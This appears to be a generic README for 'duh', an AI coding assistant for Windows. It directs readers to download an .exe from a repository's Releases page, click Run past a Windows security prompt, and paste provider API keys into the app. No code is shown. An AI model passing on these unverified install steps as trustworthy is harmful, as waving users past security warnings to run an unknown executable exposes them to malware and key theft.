# 🤖 duh - Powerful AI coding assistant for everyone

[![](https://img.shields.io/badge/Download-Duh-blue.svg)](https://github.com/radiographic-uncle4030/duh)

Duh serves as a universal harness for your coding projects. This tool connects your workspace to various artificial intelligence models to help you write code faster. It handles the complex setup so you can focus on building your programs.

## 📥 How to download the program

You need to obtain the installer from the official repository page.

1. Open your web browser.
2. Visit [the official download page](https://github.com/radiographic-uncle4030/duh).
3. Look for the latest version under the Releases section on the right side of the screen.
4. Select the file ending in .exe to start the download.
5. Save the file to your computer.

## 🛠️ Setting up the software

Follow these steps to install the harness on your Windows machine.

1. Locate the file you downloaded in your folder.
2. Double-click the file to open the installer.
3. Windows might show a security prompt. Click Run to continue.
4. Follow the prompts on the screen.
5. Click Finish to complete the installation.

## 🚀 Running your first project

Your computer now contains the tools required to power your coding agent. Open the application from your desktop shortcut or your start menu.

The interface shows a simple box where you type your needs. You can ask for basic functions, code snippets, or explanations for specific segments of text. The engine gathers info from your selected AI provider and returns the result in the window.

## 🔌 Connecting your AI provider

The software works with several AI sources. You must provide a key to activate these services.

1. Open the settings menu inside the application.
2. Select the Provider tab.
3. Choose your preferred AI service from the list.
4. Paste your secret key into the text box.
5. Save your changes.

The application stores this key locally on your machine. It keeps your data separate from the main program files for security.

## 📋 Recommended system requirements

This tool runs on most modern desktop environments. Ensure your system meets these standards for the best experience.

*   System: Windows 10 or Windows 11.
*   Memory: 8 gigabytes of RAM or higher.
*   Storage: 500 megabytes of free space.
*   Connection: Stable internet access to contact the AI servers.

## 🏗️ Managing your workspace

You can point the harness at any folder on your machine. This allows the AI to read your files and suggest changes.

1. Click the Folder icon in the top toolbar.
2. Browse to the location of your project.
3. Select the folder.
4. Wait for the indexer to finish scanning your files.

The indexer creates a map of your project. This map helps the AI understand the context of your work. You will see a small green indicator when the workspace is ready.

## ⚙️ Customizing the output

You can change how the software behaves in the configuration panel.

*   Theme: Switch between light and dark modes to suit your preference.
*   Model selection: Pick a smaller model for speed or a larger model for complex tasks.
*   History: Decide how much of your past conversation the tool remembers.

Use the settings menu to save these preferences. The application loads your configuration every time you start it.

## 🧠 Using the coding assistant

Type your request in plain English. For example, you can type "Create a function to calculate a percentage" or "Explain what this file does."

The agent processes your request and displays the code. Use the Copy button to capture the result. You can then paste that code directly into your own files.

## 🔍 Troubleshooting common issues

If the application does not start, verify your internet connection. The tool needs to reach the network to verify the credentials.

*   Application freezes: Close the program from the task manager and restart it.
*   No response: Check your API key. Keys can expire or run out of credit.
*   Slow performance: Close other large programs while you run the agent to free up system memory.

## 📦 Keeping the software current

The developer updates the code regularly. Check the download page every few weeks. If a new version exists, download the new installer and run it over the old version. The installer handles the update automatically and keeps your settings intact.
